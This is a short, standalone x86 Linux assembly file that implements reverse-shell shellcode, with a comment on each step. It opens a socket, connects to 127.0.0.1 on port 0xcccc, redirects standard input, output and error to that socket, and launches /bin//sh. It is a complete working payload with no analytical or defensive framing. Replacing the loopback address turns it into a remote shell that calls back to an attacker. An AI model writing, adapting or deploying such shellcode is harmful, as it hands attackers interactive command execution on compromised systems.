        .intel_syntax noprefix
        .globl _start
_start:
        # s = socket(AF_INET, SOCK_STREAM, 0)
        xor edx, edx
        xor ebx, ebx
        push ebx
        inc ebx
        push ebx
        push 2
        mov ecx, esp
        lea eax, [edx+102]
        int 0x80
        # connect(s, {sa_family=AF_INET, sin_port=htons(0xcccc), sin_addr=inet_addr("127.0.0.1")}, 16)
        pop ebx
        pop esi
        inc ebx
        push 0x0100007f
        push 0xcccc0002
        push 16
        push ecx
        push eax
        mov ecx, esp
        mov al, 102
        int 0x80
        # dup2(s, 0), dup2(s, 1), dup2(s, 2)
        pop ebx
        lea ecx, [edx+2]
dup_loop:
        mov al, 63
        int 0x80
        dec ecx
        jge dup_loop
        # execve("/bin//sh", {"/bin//sh", NULL}, NULL)
        add esp, 0x10
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
